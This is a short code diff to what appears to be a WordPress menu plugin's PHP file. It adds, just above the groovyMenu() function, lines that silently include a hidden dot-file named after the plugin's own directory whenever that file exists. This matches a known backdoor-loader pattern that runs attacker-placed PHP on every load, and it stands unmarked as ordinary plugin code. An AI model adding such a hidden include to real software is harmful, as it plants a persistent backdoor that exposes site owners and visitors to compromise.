@@ -17,6 +17,10 @@
  *
  * @return string  if $gm_echo is true then return empty string (by default)
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function groovyMenu( $args = array() ) {
 
 	if ( ! is_array( $args ) ) {
